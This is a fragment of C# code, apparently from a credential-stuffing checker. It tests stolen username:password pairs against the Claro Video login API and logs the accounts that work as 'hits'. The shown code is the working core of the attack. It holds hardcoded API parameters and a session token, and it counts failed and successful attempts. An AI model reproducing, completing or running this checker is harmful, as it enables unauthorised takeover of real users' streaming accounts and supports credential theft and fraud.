                ...
                try
                {
                    ...
                    using (var req = new HttpRequest())
                    {
                        ...
                        try
                        {
                            ...
                            var text2 = req
                                .Get(
                                    "https://mfwkweb-api.clarovideo.net/services/user/login?device_id=web&device_category=web&device_model=web&device_type=web&device_so=Chrome&format=json&device_manufacturer=generic&authpn=webclient&authpt=tfg1h3j4k6fd7&api_version=v5.91&region=ecuador&HKS=6ncnsjb9n2iq9qa9ae6itg0fe6&username=" +
                                    array[0] + "&password=" + array[1] + "&includpaywayprofile=true").ToString();
                            if (text2.Contains("\":\"N\""))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            ...
                            else if (text2.Contains("\":\"OK\"}"))
                            {
                                ...
                                if (Program.lorc == "LOG") Settings.PrintHit("Clarovideo", array[0] + ":" + array[1]);
